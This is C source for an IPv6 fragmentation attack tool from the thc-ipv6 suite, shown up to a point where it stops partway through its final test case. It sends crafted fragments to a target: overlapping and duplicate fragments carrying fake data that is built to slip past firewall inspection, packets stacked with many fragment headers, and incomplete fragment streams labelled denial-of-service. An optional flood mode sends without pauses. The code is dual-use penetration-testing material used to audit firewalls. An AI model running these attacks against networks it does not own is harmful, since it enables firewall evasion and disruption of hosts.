
/*
 * checks if a firewall performs a check on a second, duplicate fragment
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

extern int debug;

int rawmode = 0;
int matched = 0, gtype1, gtype1a, gtype2, gtype2a, gpos, epos;
unsigned char *gpattern, *gsrc, *gdst;

void help(char *prg) {
  printf("%s %s (c) 2011 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-fp] [-n number] interface destination [test-case-no]\n\n", prg);
  printf("-f activates flooding mode, no pauses between sends; -p disables first and\n");
  printf("final pings, -n number specifies how often each test is performed\n");
  printf("\nPerforms fragment firewall and implementation checks, incl. denial-of-service.\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  int test = 0, count = 0, only = 0, i, flood = 0, inc = 0, ping = 1, resend = 1, curr = 0;
  unsigned char buf[1500], bla[1200], tests[256];
  unsigned char *dst6, *ldst6 = malloc(16), *src6, *lsrc6, *mcast6;
  unsigned char *srcmac = NULL, *dstmac = NULL, *routers[2], null_buffer[6];
  thc_ipv6_hdr *hdr;
  int j, k, srcmtu, fragsize, use_srcroute_type = -1;
  pcap_t *p;
  unsigned char *pkt = NULL, *pkt2 = NULL, *pkt3 = NULL;
  int pkt_len = 0, pkt_len2 = 0, pkt_len3 = 0, noping = 0;
  char *interface, tos;

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  while ((i = getopt(argc, argv, "fprn:")) >= 0) {
    switch (i) {
    case 'r':
      rawmode = 1;
      thc_ipv6_rawmode(1);
      break;
    case 'n':
      resend = atoi(optarg);
      break;
    case 'p':
      ping = 0;
      break;
    case 'f':
      flood = 1;
      break;
    default:
      fprintf(stderr, "Error: invalid option %c\n", i);
      exit(-1);
    }
  }

  if (argc - optind < 2)
    help(argv[0]);

  interface = argv[optind];
  dst6 = thc_resolve6(argv[optind + 1]);
  if (argc - optind > 2 && argv[optind + 2] != NULL)
    only = atoi(argv[optind + 2]);

  if (flood && (only == 0 || resend != 1)) {
    fprintf(stderr, "Error: the -f flood option must be used with a defined testcase, and the -n option can not be used with it\n");
    exit(-1);
  }

  src6 = thc_get_own_ipv6(interface, dst6, PREFER_GLOBAL);
  srcmac = thc_get_own_mac(interface);
  if (rawmode == 0) {
    if ((dstmac = thc_get_mac(interface, src6, dst6)) == NULL) {
      fprintf(stderr, "ERROR: Can not resolve mac address for %s\n", argv[2]);
      exit(-1);
    }
  } else
    dstmac = null_buffer;

  fragsize = ((200 - 62) / 8) * 8;

  setvbuf(stdout, NULL, _IONBF, 0);
  memset(tests, 0, sizeof(tests));

  printf("Run a sniffer behind the firewall to see what passes through\n\n");

  memset(bla, 'A', sizeof(bla));
  if ((pkt = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len, src6, dst6, 255, 0, count, 0, 0)) == NULL)
    return -1;
  thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xb00bb00b, (unsigned char *) &bla, sizeof(bla), 0);
  if (thc_generate_pkt(interface, srcmac, dstmac, pkt, &pkt_len) < 0)
    return -1;
   /**/ memset(bla, 'Z', sizeof(bla));
  if ((pkt2 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len2, src6, dst6, 255, 0, count, 0, 0)) == NULL)
    return -1;
  thc_add_icmp6(pkt2, &pkt_len2, ICMP6_PINGREQUEST, 0, 0xb00bb00b, (unsigned char *) &bla, sizeof(bla), 0);
  if (thc_generate_pkt(interface, srcmac, dstmac, pkt2, &pkt_len2) < 0)
    return -1;
  if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
    return -1;

  printf("ATTACK initialisation\n");

  if (ping) {
    printf("  Sending ping to %s\n", argv[optind + 1]);
    thc_ping6(interface, src6, dst6, 10, 1);
//  printf("Now sleeping for 1 second\n");
    sleep(1);
  }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Firewall %d - resending fragments with different data within stream (2nd real)\n", count);
      printf("  Sending first fragment\n");
      hdr = (thc_ipv6_hdr *) pkt;
      pkt3 = thc_destroy_packet(pkt3);
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending second fragment with fake data and ttl=2 \n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt2;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 2, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
//  printf("Now sleeping for 1 second\n");
      if (!flood)
        sleep(1);
      printf("  Sending duplicate second fragment with real data and ttl=64\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 101, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Firewall %d - resending fragments with different data within stream (1st real)\n", count);
      printf("  Sending first fragment\n");
      hdr = (thc_ipv6_hdr *) pkt;
      pkt3 = thc_destroy_packet(pkt3);
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending duplicate second fragment with real data and ttl=64\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending second fragment with fake data and ttl=2 \n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt2;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 2, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
//  printf("Now sleeping for 1 second\n");
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 101, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Firewall %d - resending fragments with different data after completion\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending second fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending third and final fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 101, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending duplicate second fragment with fake data\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt2;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Firewall %d - overlapping third fragment into second with valid data\n", count);
      printf("  Sending first fragment\n");
      hdr = (thc_ipv6_hdr *) pkt;
      pkt3 = thc_destroy_packet(pkt3);
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending second fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment overlapping into second\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 101 - 128 / 8, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808 - 128, 400 + 128);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400 + 128))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Firewall %d - overlapping third fragment into second\n", count);
      printf("  Sending first fragment\n");
      hdr = (thc_ipv6_hdr *) pkt;
      pkt3 = thc_destroy_packet(pkt3);
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending second fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      memset(buf + 400 - 128, 'Z', 128);        // bad data we overwrite in next packet
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment overlapping into second\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 101 - 128 / 8, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808 - 128, 400 + 128);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400 + 128))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Firewall %d - overlapping second fragment into third\n", count);
      printf("  Sending first fragment\n");
      hdr = (thc_ipv6_hdr *) pkt;
      pkt3 = thc_destroy_packet(pkt3);
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending third and final fragment - but not the last\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 101, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808, 400);
      memset(buf, 'Z', 128);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending second fragment overlapping into third\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400 + 128);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400 + 128))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Implementation %d - one shot fragment\n", count);
      printf("  Sending one-shot fragment ping\n");
      pkt3 = thc_destroy_packet(pkt3);
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 255, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_oneshotfragment(pkt3, &pkt_len3, 0xdead0000 + count + curr) < 0)
        return -1;
      thc_add_icmp6(pkt3, &pkt_len3, ICMP6_PINGREQUEST, 0, 0xdead0000 + count + curr, (unsigned char *) &bla, sizeof(bla), 0);
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Implementation %d - double one shot fragments\n", count);
      printf("  Sending double one-shot fragments ping\n");
      pkt3 = thc_destroy_packet(pkt3);
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 255, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_oneshotfragment(pkt3, &pkt_len3, 0xaaaa0000 + count + curr) < 0)
        return -1;
      if (thc_add_hdr_oneshotfragment(pkt3, &pkt_len3, 0xbbbb0000 + count + curr) < 0)
        return -1;
      thc_add_icmp6(pkt3, &pkt_len3, ICMP6_PINGREQUEST, 0, 0xdead0000 + count + curr, (unsigned char *) &bla, sizeof(bla), 0);
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Implementation %d - 137 one shot fragments\n", count);
      printf("  Sending 137 one-shot fragments ping\n");
      pkt3 = thc_destroy_packet(pkt3);
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 255, 0, count, 0, 0)) == NULL)
        return -1;
      for (i = 0; i < 137; i++)
        if (thc_add_hdr_oneshotfragment(pkt3, &pkt_len3, 0xffff0000 + i + count + curr << 7) < 0)
          return -1;
      thc_add_icmp6(pkt3, &pkt_len3, ICMP6_PINGREQUEST, 0, 0xdeaddead + count + curr, (unsigned char *) &bla, 120, 0);
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Implementation %d - 180 one shot fragments\n", count);
      printf("  Sending 180 one-shot fragments ping\n");
      pkt3 = thc_destroy_packet(pkt3);
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 255, 0, count, 0, 0)) == NULL)
        return -1;
      for (i = 0; i < 180; i++)
        if (thc_add_hdr_oneshotfragment(pkt3, &pkt_len3, 0xffff0000 + i + count + curr << 7) < 0)
          return -1;
      thc_add_icmp6(pkt3, &pkt_len3, ICMP6_PINGREQUEST, 0, 0xdeaddead + count + curr, (unsigned char *) &bla, 8, 0);
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK Implementation %d - replacing fragments with new, different data\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending second fragment with fake data\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt2;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending duplicate second fragment with real data and ttl=64\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 101, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - sending only first fragment\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - sending only second fragment\n", count);
      printf("  Sending second fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 1051, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - sending only last fragment\n", count);
      printf("  Sending third and final fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 7501, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - sending first, middle and final frag with 1k holes in between\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
